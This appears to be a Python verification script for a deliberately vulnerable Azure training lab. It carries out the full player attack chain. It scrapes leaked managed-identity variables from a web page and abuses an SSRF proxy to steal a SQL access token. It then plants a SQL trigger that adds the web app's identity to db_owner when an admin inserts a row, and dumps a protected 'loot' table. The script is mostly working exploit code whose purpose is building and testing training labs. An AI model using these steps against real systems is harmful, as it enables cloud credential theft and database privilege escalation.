#!/usr/bin/env python3
"""
End-to-end verification of the trigger-escalation chain on a deployed
ExpanseAzureLab. Walks the same chain a player would, with explicit
assertions at each step. Prints PASS/FAIL per check and exits non-zero
on any failure.

Reads config from environment variables (also accepts a .env file).
Required:
    WEBAPP_FQDN          e.g. tycho-terminal-xxx.azurewebsites.net
    SQL_FQDN             e.g. tycho-xxx.database.windows.net

Optional (enables the fast "fire the trigger now" path; otherwise the
script falls back to waiting up to ~6 min for a natural Donnager heartbeat):
    TENANT_ID
    ADMIN_SP_CLIENT_ID   the tycho_db_sa_sp_client_id output
    ADMIN_SP_SECRET      the tycho_db_sp_client_secret output

Modes:
    (default)            Full chain: leak -> token -> plant -> fire -> verify
    --no-fire            Plant only, then wait for natural heartbeat to fire it
    --cleanup            Drop the trigger and remove the webapp MI from db_owner
    --check-only         Only enumerate state; do not plant or modify anything

Requires: Python 3.9+, pyodbc, ODBC Driver 18 for SQL Server.
Network egress must come from the IP whitelisted in terraform.tfvars (client_ip).
"""
from __future__ import annotations

import argparse
import base64
import html
import json
import os
import re
import struct
import sys
import time
import urllib.parse
import urllib.request


# ---------------------------------------------------------------- tiny output
GREEN, RED, CYAN, YELLOW, RESET = "\033[32m", "\033[31m", "\033[36m", "\033[33m", "\033[0m"
PASS = f"{GREEN}[+]{RESET}"
FAIL = f"{RED}[-]{RESET}"
INFO = f"{CYAN}[*]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"

_fail_count = 0
def expect(cond: bool, msg: str) -> None:
    global _fail_count
    print("    " + (PASS if cond else FAIL) + " " + msg)
    if not cond:
        _fail_count += 1

def step(n: int, title: str) -> None:
    print(f"\n{INFO} {n}) {title}")


# ---------------------------------------------------------------- helpers
def load_dotenv(path: str = ".env") -> None:
    if not os.path.isfile(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))


def decode_jwt(token: str) -> dict:
    payload = token.split(".")[1]
    return json.loads(base64.urlsafe_b64decode(payload + "==="))


def http_get(url: str, timeout: int = 10) -> str:
    return urllib.request.urlopen(url, timeout=timeout).read().decode("utf-8", errors="replace")


def http_post_json(url: str, body: dict, timeout: int = 15) -> str:
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", errors="replace")


def env_from_services_page(webapp_base: str) -> tuple[str, str]:
    """Scrape the IDENTITY_ENDPOINT/IDENTITY_HEADER from /services."""
    page = http_get(webapp_base + "/services")
    def grab(key: str) -> str | None:
        m = re.search(r"<td><code>" + re.escape(key) +
                      r"</code></td>\s*<td><code>([^<]+)</code></td>", page)
        return html.unescape(m.group(1)) if m else None
    return grab("IDENTITY_ENDPOINT"), grab("IDENTITY_HEADER")


def ssrf_for_db_token(webapp_base: str, ident_endpoint: str, ident_header: str) -> str:
    """Use /api/proxy to make the webapp call its own IMDS for a SQL token."""
    resp = http_post_json(
        webapp_base + "/api/proxy",
        {"url": f"{ident_endpoint}?resource=https://database.windows.net/&api-version=2019-08-01",
         "headers": f"X-IDENTITY-HEADER: {ident_header}"},
    )
    m = re.search(r'"access_token":\s*"([^"]+)"', resp)
    if not m:
        raise RuntimeError("could not extract access_token from /api/proxy response")
    return m.group(1)


def admin_sp_token(tenant_id: str, client_id: str, secret: str) -> str:
    """Acquire a database.windows.net token for the Tycho admin SP via client_credentials."""
    body = ("grant_type=client_credentials"
            f"&client_id={client_id}"
            f"&client_secret={urllib.parse.quote(secret)}"
            "&resource=https://database.windows.net/")
    req = urllib.request.Request(
        f"https://login.microsoftonline.com/{tenant_id}/oauth2/token",
        data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read())["access_token"]


# pyodbc connection helper that uses the SQL Server access-token attribute.
SQL_COPT_SS_ACCESS_TOKEN = 1256  # ODBC driver-specific attr id for token auth


def sql_connect(server: str, db: str, token: str):
    import pyodbc
    pyodbc.pooling = False  # critical: per-call fresh TDS sessions
    b = token.encode("utf-16-le")
    s = struct.pack(f"<I{len(b)}s", len(b), b)
    cs = (f"Driver={{ODBC Driver 18 for SQL Server}};Server=tcp:{server},1433;"
          f"Database={db};Encrypt=yes;TrustServerCertificate=no;Connection Timeout=30;")
    return pyodbc.connect(cs, attrs_before={SQL_COPT_SS_ACCESS_TOKEN: s}, autocommit=True)


# ---------------------------------------------------------------- run modes
def run_full_chain(args):
    fqdn = args.webapp_fqdn.strip()
    if fqdn.startswith("https://"): fqdn = fqdn[len("https://"):]
    if fqdn.startswith("http://"):  fqdn = fqdn[len("http://"):]
    webapp = "https://" + fqdn.rstrip("/")
    sql_server = args.sql_fqdn

    # 1. SSRF leak
    step(1, "Scrape /services for IMDS env vars")
    ie, ih = env_from_services_page(webapp)
    print(f"    IDENTITY_ENDPOINT = {ie}")
    print(f"    IDENTITY_HEADER   = {ih}")
    expect(bool(ie and ie.startswith("http://")), "IDENTITY_ENDPOINT leaked")
    expect(bool(ih and len(ih) > 20),               "IDENTITY_HEADER leaked")

    # 2. SSRF token exfiltration
    step(2, "SSRF /api/proxy -> IMDS for database.windows.net token")
    mi_token = ssrf_for_db_token(webapp, ie, ih)
    p = decode_jwt(mi_token)
    print(f"    JWT aud={p['aud']}  appid={p['appid']}  tid={p['tid']}")
    expect(p["aud"] == "https://database.windows.net/", "token aud = database.windows.net")

    # 3. Connect as webapp MI
    step(3, "Connect to tycho-db with token (pyodbc + access-token attr)")
    cn = sql_connect(sql_server, "tycho-db", mi_token)
    cur = cn.cursor()
    cur.execute("SELECT USER_NAME(), ORIGINAL_LOGIN();")
    me_user, me_login = cur.fetchone()
    print(f"    USER_NAME() = {me_user}")
    print(f"    ORIGINAL_LOGIN() = {me_login}")
    expect(me_user.startswith("tycho-terminal-"), "connected as the webapp MI")

    # 4. Enumerate -- verify the new restricted shape
    step(4, "Verify permission shape (per-table grants, no role memberships)")
    cur.execute("""
        SELECT r.name FROM sys.database_role_members rm
        JOIN sys.database_principals  r  ON r.principal_id = rm.role_principal_id
        JOIN sys.database_principals  me ON me.principal_id = rm.member_principal_id
        WHERE me.name = USER_NAME();""")
    roles = [r[0] for r in cur.fetchall()]
    print(f"    roles: {roles or '(only public)'}")
    expect("db_datareader" not in roles, "NOT member of db_datareader")
    expect("db_datawriter" not in roles, "NOT member of db_datawriter")
    expect("db_owner"      not in roles, "NOT member of db_owner (yet)")

    cur.execute("""
        SELECT p.permission_name, s.name + '.' + o.name AS obj, p.state_desc
        FROM sys.database_permissions p
        JOIN sys.objects o ON p.major_id = o.object_id
        JOIN sys.schemas s ON o.schema_id = s.schema_id
        JOIN sys.database_principals me ON me.principal_id = p.grantee_principal_id
        WHERE me.name = USER_NAME()
        ORDER BY obj, permission_name;""")
    grants = [(p, o, st) for p, o, st in cur.fetchall()]
    print(f"    {len(grants)} object grants visible to this principal")
    expected = set()
    for tbl in ("dbo.ships", "dbo.crew_manifest",
                "dbo.espionage_credentials", "dbo.protomolecule_incidents",
                "dbo.fleet_heartbeat"):
        for perm in ("SELECT", "INSERT", "UPDATE", "DELETE"):
            expected.add((perm, tbl, "GRANT"))
    expected.add(("ALTER",           "dbo.fleet_heartbeat",       "GRANT"))
    expected.add(("VIEW DEFINITION", "dbo.protomolecule_samples", "GRANT"))
    got = set(grants)
    missing = expected - got
    extra   = got - expected
    if missing:
        for p, o, st in sorted(missing):
            expect(False, f"missing grant: {st} {p} {o}")
    else:
        expect(True, f"all {len(expected)} expected grants present")
    if extra:
        print(f"    {WARN} unexpected extra grants: {sorted(extra)}")

    # 5. Loot visible-but-not-readable
    step(5, "Loot table dbo.protomolecule_samples: visible in catalog, SELECT blocked")
    cur.execute("SELECT name FROM sys.tables WHERE name = 'protomolecule_samples';")
    expect(cur.fetchone() is not None,
           "protomolecule_samples visible in sys.tables (via VIEW DEFINITION)")
    blocked = False
    try:
        cur.execute("SELECT TOP 1 * FROM dbo.protomolecule_samples;").fetchall()
    except Exception as e:
        blocked = "permission" in str(e).lower()
        print(f"    blocked: {str(e)[:140]}")
    expect(blocked, "SELECT on dbo.protomolecule_samples is permission denied")

    # 6. Direct escalation blocked
    step(6, "Direct ALTER ROLE blocked (no implicit role-altering rights)")
    blocked = False
    try:
        cur.execute(f"ALTER ROLE db_owner ADD MEMBER [{me_user}];")
    except Exception as e:
        blocked = True
        print(f"    blocked: {str(e)[:140]}")
    expect(blocked, "direct ALTER ROLE blocked")

    if args.check_only:
        cn.close()
        return

    # 7. Plant the trigger
    step(7, "Plant DML trigger on dbo.fleet_heartbeat")
    cur.execute(f"""
        CREATE OR ALTER TRIGGER dbo.trg_heartbeat_pwn
        ON dbo.fleet_heartbeat AFTER INSERT AS
        BEGIN
            SET NOCOUNT ON;
            IF IS_MEMBER('db_owner') = 1
                ALTER ROLE db_owner ADD MEMBER [{me_user}];
        END;""")
    print("    trigger created")
    cn.close()

    # 8. Cause the trigger to fire in admin context
    if args.no_fire:
        # Natural-heartbeat path.
        step(8, "Wait for the next Donnager heartbeat tick (no admin creds provided)")
        last_known = wait_for_new_heartbeat(sql_server, mi_token, max_wait_s=420)
        expect(last_known is not None, "saw a fresh heartbeat row from 'fred' within 7 min")
    else:
        # Fast path via admin SP creds.
        step(8, "Fire heartbeat as the Tycho admin SP (substitutes for the scheduled task)")
        adm = admin_sp_token(args.tenant_id, args.admin_client_id, args.admin_secret)
        adec = decode_jwt(adm)
        print(f"    admin token appid={adec['appid']} (expected {args.admin_client_id})")
        expect(adec["appid"] == args.admin_client_id, "client_credentials returned the right SP")
        cn = sql_connect(sql_server, "tycho-db", adm)
        cur = cn.cursor()
        cur.execute("SELECT USER_NAME(), ORIGINAL_LOGIN(), IS_MEMBER('db_owner');")
        u, l, m = cur.fetchone()
        print(f"    admin session: USER_NAME={u}  ORIGINAL_LOGIN={l}  IS_MEMBER(db_owner)={m}")
        expect(m == 1, "admin SP authenticates as db_owner-equivalent (dbo)")
        cur.execute("""INSERT INTO dbo.fleet_heartbeat (ship, status, note)
                       VALUES ('Donnager','Nominal','verify_chain trigger fire');""")
        print("    INSERT executed under admin context")
        cn.close()

    # 9. Verify the escalation took
    step(9, "Reconnect as webapp MI and verify escalation + loot")
    time.sleep(1)
    cn = sql_connect(sql_server, "tycho-db", mi_token)
    cur = cn.cursor()
    cur.execute("""
        SELECT r.name FROM sys.database_role_members rm
        JOIN sys.database_principals  r  ON r.principal_id = rm.role_principal_id
        JOIN sys.database_principals  me ON me.principal_id = rm.member_principal_id
        WHERE me.name = USER_NAME();""")
    roles_after = [r[0] for r in cur.fetchall()]
    print(f"    roles AFTER: {roles_after}")
    expect("db_owner" in roles_after, "webapp MI is now in db_owner")
    cur.execute("""SELECT designation, storage_facility, clearance_level, status
                   FROM dbo.protomolecule_samples ORDER BY sample_id;""")
    rows = cur.fetchall()
    expect(len(rows) > 0, f"loot now readable ({len(rows)} rows)")
    print(f"    LOOT ({len(rows)} rows):")
    for r in rows:
        print(f"      {r[0]:22} | {r[1]:38} | {r[2]:28} | {r[3]}")
    cn.close()


def wait_for_new_heartbeat(server: str, token: str, max_wait_s: int) -> str | None:
    """Poll fleet_heartbeat for a row newer than the baseline. Returns ts of new row."""
    cn = sql_connect(server, "tycho-db", token); cur = cn.cursor()
    cur.execute("SELECT ISNULL(MAX(ts), '1900-01-01') FROM dbo.fleet_heartbeat;")
    baseline = cur.fetchone()[0]
    cn.close()
    print(f"    baseline ts = {baseline}")
    print(f"    polling for new heartbeat row, up to {max_wait_s}s...")
    deadline = time.time() + max_wait_s
    while time.time() < deadline:
        time.sleep(15)
        cn = sql_connect(server, "tycho-db", token); cur = cn.cursor()
        cur.execute("SELECT MAX(ts) FROM dbo.fleet_heartbeat;")
        cur_ts = cur.fetchone()[0]
        cn.close()
        if cur_ts and cur_ts > baseline:
            print(f"    new heartbeat: {cur_ts}")
            return str(cur_ts)
    return None


def run_cleanup(args):
    fqdn = args.webapp_fqdn.strip()
    if fqdn.startswith("https://"): fqdn = fqdn[len("https://"):]
    if fqdn.startswith("http://"):  fqdn = fqdn[len("http://"):]
    webapp = "https://" + fqdn.rstrip("/")
    sql_server = args.sql_fqdn
    print(f"{INFO} Re-leak webapp MI token and connect")
    ie, ih = env_from_services_page(webapp)
    tok = ssrf_for_db_token(webapp, ie, ih)
    cn = sql_connect(sql_server, "tycho-db", tok); cur = cn.cursor()
    cur.execute("SELECT USER_NAME();")
    me = cur.fetchone()[0]
    print(f"    connected as {me}")

    print(f"{INFO} Drop trigger dbo.trg_heartbeat_pwn (if present)")
    cur.execute("IF OBJECT_ID('dbo.trg_heartbeat_pwn','TR') IS NOT NULL DROP TRIGGER dbo.trg_heartbeat_pwn;")
    print("    done")

    print(f"{INFO} Remove [{me}] from db_owner (if a member)")
    cur.execute(f"""IF IS_ROLEMEMBER('db_owner', '{me}') = 1
                       ALTER ROLE db_owner DROP MEMBER [{me}];""")
    print("    done")
    cn.close()


# ---------------------------------------------------------------- main
def main():
    load_dotenv()
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--no-fire",    action="store_true", help="plant only; wait for natural heartbeat to fire it")
    p.add_argument("--check-only", action="store_true", help="enumerate state; do not plant or modify anything")
    p.add_argument("--cleanup",    action="store_true", help="drop trigger and remove webapp MI from db_owner")
    args = p.parse_args()

    args.webapp_fqdn      = os.environ.get("WEBAPP_FQDN", "")
    args.sql_fqdn         = os.environ.get("SQL_FQDN", "")
    args.tenant_id        = os.environ.get("TENANT_ID", "")
    args.admin_client_id  = os.environ.get("ADMIN_SP_CLIENT_ID", "")
    args.admin_secret     = os.environ.get("ADMIN_SP_SECRET", "")

    if not args.webapp_fqdn or not args.sql_fqdn:
        print(f"{FAIL} WEBAPP_FQDN and SQL_FQDN are required (env or .env)", file=sys.stderr)
        sys.exit(2)

    if not args.no_fire and not args.cleanup and not args.check_only:
        if not (args.tenant_id and args.admin_client_id and args.admin_secret):
            print(f"{WARN} no admin SP creds provided -> falling back to --no-fire (waits for natural heartbeat)")
            args.no_fire = True

    if args.cleanup:
        run_cleanup(args)
        return

    run_full_chain(args)

    print()
    if _fail_count == 0:
        print(f"{GREEN}=== ALL CHECKS PASSED ==={RESET}")
        sys.exit(0)
    else:
        print(f"{RED}=== {_fail_count} CHECK(S) FAILED ==={RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
